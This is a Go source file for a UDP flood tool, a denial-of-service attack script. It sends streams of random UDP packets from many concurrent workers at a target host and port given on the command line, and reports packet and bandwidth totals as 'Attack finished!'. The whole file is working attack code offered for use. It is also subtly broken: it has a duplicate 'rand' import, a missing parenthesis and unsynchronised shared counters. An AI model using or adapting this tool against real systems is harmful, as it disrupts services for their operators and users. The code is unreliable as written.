/*
UDP Flood Tool
Original Author: Leeon123
Modified for UDP-only version
*/
package main

import (
	"crypto/rand"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

func main() {
	fmt.Println("|--------------------------------------|")
	fmt.Println("|        UDP Flood Tool (Golang)       |")
	fmt.Println("|     Modified from Lee0n123's code    |")
	fmt.Println("|--------------------------------------|")
	
	if len(os.Args) != 6 {
		fmt.Printf("Usage: %s <target> <port> <connections> <seconds> <timeout>\n", os.Args[0])
		fmt.Println("Example: ./udpflood example.com 80 1000 60 5")
		os.Exit(1)
	}

	// Parse command line arguments
	target := os.Args[1]
	port, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Error: Port must be a number")
		os.Exit(1)
	}
	
	connections, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("Error: Connections must be a number")
		os.Exit(1)
	}
	
	seconds, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("Error: Seconds must be a number")
		os.Exit(1)
	}
	
	timeout, err := strconv.Atoi(os.Args[5])
	if err != nil {
		fmt.Println("Error: Timeout must be a number")
		os.Exit(1)
	}

	// Resolve target IP
	ip, err := net.LookupIP(target)
	if err != nil {
		fmt.Printf("Error resolving IP: %v\n", err)
		os.Exit(1)
	}
	targetAddr := &net.UDPAddr{
		IP:   ip[0],
		Port: port,
	}

	fmt.Printf("Starting UDP flood to %s:%d for %d seconds with %d connections\n", 
		target, port, seconds, connections)
	fmt.Println("Press CTRL+C to stop early")

	var (
		wg       sync.WaitGroup
		stop     int
		packets  uint64
		bytes    uint64
		errCount uint64
	)

	// Start flood workers
	for i := 0; i < connections; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			
			// Create UDP connection
			conn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.ParseIP("0.0.0.0"), Port: 0})
			if err != nil {
				fmt.Printf("Worker %d: Error creating socket: %v\n", workerID, err)
				return
			}
			defer conn.Close()
			
			// Set timeout
			conn.SetDeadline(time.Now().Add(time.Duration(timeout) * time.Second)
			
			// Flood loop
			buffer := make([]byte, 1024) // 1KB packets
			for stop == 0 {
				// Generate random payload
				rand.Read(buffer)
				
				// Send packet
				_, err := conn.WriteToUDP(buffer, targetAddr)
				if err != nil {
					errCount++
					continue
				}
				
				packets++
				bytes += uint64(len(buffer))
				
				// Small delay to prevent overwhelming local network stack
				time.Sleep(10 * time.Millisecond)
			}
		}(i)
	}

	// Timer
	done := make(chan struct{})
	go func() {
		time.Sleep(time.Duration(seconds) * time.Second)
		close(done)
	}()

	// Stats printer
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		
		for {
			select {
			case <-ticker.C:
				fmt.Printf("\rPackets: %d | Bytes: %.2f MB | Errors: %d", 
					packets, float64(bytes)/(1024*1024), errCount)
			case <-done:
				return
			}
		}
	}()

	// Wait for timer or CTRL+C
	<-done
	stop = 1
	wg.Wait()

	// Final stats
	fmt.Println("\n\nAttack finished!")
	fmt.Printf("Total packets sent: %d\n", packets)
	fmt.Printf("Total data sent: %.2f MB\n", float64(bytes)/(1024*1024))
	fmt.Printf("Average packets/sec: %.2f\n", float64(packets)/float64(seconds))
	fmt.Printf("Average bandwidth: %.2f Mbps\n", 
		(float64(bytes)*8)/(float64(seconds)*1024*1024))
	fmt.Printf("Total errors: %d\n", errCount)
}